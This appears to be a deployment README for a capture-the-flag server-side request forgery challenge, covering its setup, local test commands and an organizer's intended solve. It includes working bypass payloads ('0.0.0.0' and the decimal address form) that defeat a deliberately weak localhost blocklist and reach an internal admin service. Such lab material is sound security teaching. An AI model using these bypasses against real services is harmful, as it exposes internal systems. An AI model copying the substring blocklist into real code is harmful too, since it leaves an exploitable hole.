# 24 — Mirage Preview (deployable)

A server-side request forgery (SSRF) challenge. Each team gets its own preview
service.

- **Type:** `dynamic_docker` (ctfd-whale), HTTP redirect, port 80.
- **Flag:** injected by whale as the `FLAG` env var; returned by an internal
  admin service bound to `127.0.0.1:8081` inside the container. Only port 80 is
  routed to players, so the admin service is unreachable from outside.
- **Vulnerability:** the preview app fetches any `http(s)` URL the player gives
  it. Its only defence is a substring blocklist of `localhost` and `127.0.0.1`.
- **Intended solve (organizer note):** reach the loopback admin service through
  another spelling of `127.0.0.1` that dodges the blocklist:
  ```
  /?url=http://0.0.0.0:8081/flag
  /?url=http://2130706433:8081/flag      (decimal form of 127.0.0.1)
  ```
  The admin service prints `vault key: TAIBAH{...}`.

> Security note: like the other exploitation challenges, prefer whale's
> **grouped containers** at the event so each instance is network-isolated. The
> admin service binds to loopback, so it is private to each team's container
> even on a shared network.

## Local test

```sh
docker build -t taibah-ctf/24-mirage-preview:latest .
docker run --rm -p 8024:80 -e FLAG='TAIBAH{test}' taibah-ctf/24-mirage-preview:latest
curl -s 'http://localhost:8024/?url=http://0.0.0.0:8081/flag'
```
